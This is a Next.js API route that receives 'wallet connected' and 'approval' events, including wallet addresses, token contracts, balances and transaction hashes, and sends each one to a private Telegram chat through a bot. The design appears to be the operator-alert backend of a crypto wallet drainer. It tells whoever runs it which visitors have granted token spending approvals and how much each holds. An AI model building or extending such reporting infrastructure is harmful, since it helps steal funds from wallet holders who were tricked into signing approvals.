
import { NextResponse } from 'next/server';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const getTxLink = (chainName: string, txHash: string): string => {
    switch (chainName) {
        case "Ethereum Mainnet":
            return `https://etherscan.io/tx/${txHash}`;
        case "Arbitrum":
            return `https://arbiscan.io/tx/${txHash}`;
        case "Sepolia":
            return `https://sepolia.etherscan.io/tx/${txHash}`;
        default:
            // Fallback for unknown chains, though the link might not be valid
            return `https://etherscan.io/tx/${txHash}`;
    }
};

export async function POST(request: Request) {
    try {
        const body = await request.json();
        console.log('[report API] received:', body);
        const { event, wallet, chainName, token, symbol, balance, txHash, timestamp } = body;

        let message = '';
        const readableTimestamp = new Date(timestamp).toLocaleString('en-US', { timeZone: 'UTC', hour12: false });

        if (event === 'connect') {
            message = [
                `<b>✅ Wallet Connected</b>`,
                ``,
                `<b>💳 Wallet:</b> <code>${wallet}</code>`,
                `<b>🕒 Timestamp:</b> ${readableTimestamp} UTC`
            ].join('\n');
        } else if (event === 'approval') {
            const txLink = getTxLink(chainName, txHash);
            
            message = [
                `<b>✅ Approval Reported</b>`,
                ``,
                `<b>💳 Wallet:</b> <code>${wallet}</code>`,
                `<b>🌐 Chain:</b> ${chainName || '-'}`,
                `<b>📦 Token:</b> ${symbol} (<code>${token}</code>)`,
                `<b>💰 Balance:</b> ${balance}`,
                `<b>🔗 Tx:</b> <a href="${txLink}">View Transaction</a>`,
                `<b>🕒 Timestamp:</b> ${readableTimestamp} UTC`
            ].join('\n');

        } else {
            return NextResponse.json({ error: 'Invalid event type' }, { status: 400 });
        }

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true,
                    }),
                });
            } catch (error) {
                console.error('Failed to send Telegram message:', error);
                // Still return a success to the client, as the main job is done
            }
        }

        return NextResponse.json({ message: 'Report received' }, { status: 200 });

    } catch (error) {
        console.error('Error processing report:', error);
        return NextResponse.json({ error: 'Internal Server Error' }, { status: 500 });
    }
}
